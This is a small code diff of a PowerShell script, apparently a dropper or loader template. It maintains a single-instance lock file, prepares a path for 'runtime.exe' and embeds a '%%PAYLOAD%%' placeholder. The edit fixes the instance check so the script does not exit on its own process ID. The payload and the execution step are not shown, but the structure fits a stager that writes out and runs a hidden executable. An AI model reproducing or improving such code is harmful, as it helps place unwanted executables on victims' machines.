@@ -47,7 +47,7 @@ try{New-Item -ItemType Directory -Force -Path $dir|Out-Null}catch{}
 $lock=Join-Path $dir 'watt72.lck'
 $op=0
 if(Test-Path $lock){try{$op=[int](Get-Content -Raw $lock -EA Stop)}catch{$op=0}}
-if($op -gt 0 -and (Get-Process -Id $op -EA SilentlyContinue)){exit}
+if($op -gt 0 -and $op -ne $PID -and (Get-Process -Id $op -EA SilentlyContinue)){exit}
 try{[IO.File]::WriteAllText($lock,[string]$PID)}catch{}
 $exe=Join-Path $dir 'runtime.exe'
 $b=%%PAYLOAD%%
